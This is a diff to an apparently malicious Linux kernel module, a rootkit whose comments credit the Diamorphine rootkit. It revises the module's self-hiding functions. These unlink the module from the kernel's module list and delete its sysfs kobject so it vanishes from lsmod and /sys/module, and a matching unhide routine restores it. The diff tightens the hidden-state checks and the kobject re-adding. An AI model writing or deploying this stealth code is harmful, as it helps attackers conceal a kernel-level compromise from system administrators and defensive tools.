@@ -19,9 +19,9 @@ MODULE_VERSION("0.01");
 static short hidden = 0;
 static struct list_head *prev_module;
 
-static struct kobject *mod_kobj_ptr;
 static struct kobject *parent;
 static const char *name;
+static struct list_head prev_kobj_entry;
 
 static inline void
 tidy(void) { // more sneaky beaky stuff (copied from Diamorphine)
@@ -55,24 +55,38 @@ void hide_kobj(void) {
   name = THIS_MODULE->mkobj.kobj.name;
   parent = THIS_MODULE->mkobj.kobj.parent;
 
+  // Save the entry list position
+  prev_kobj_entry = THIS_MODULE->mkobj.kobj.entry;
+
+  // Remove from sysfs and lists
   kobject_del(&THIS_MODULE->mkobj.kobj);
-  list_del(&THIS_MODULE->mkobj.kobj.entry);
 }
 
 void hide_module(void) {
+  if (hidden)
+    return;
+
   prev_module = THIS_MODULE->list.prev;
   list_del(&THIS_MODULE->list);
-  hidden = 1;
   hide_kobj();
+  hidden = 1;
   printk(KERN_INFO "sneaky beaky time..\n");
 }
 
-void unhide_kobj(void) { mod_kobj_ptr = kobject_create_and_add(name, parent); }
+void unhide_kobj(void) {
+  // Re-add the kobject to sysfs
+  if (kobject_add(&THIS_MODULE->mkobj.kobj, parent, "%s", name) < 0) {
+    printk(KERN_ERR "Failed to re-add kobject\n");
+  }
+}
 
 void unhide(void) {
+  if (!hidden)
+    return;
+
   list_add(&THIS_MODULE->list, prev_module);
-  hidden = 0;
   unhide_kobj();
+  hidden = 0;
   printk(KERN_INFO "uh oh we've been discovered\n");
 }
 
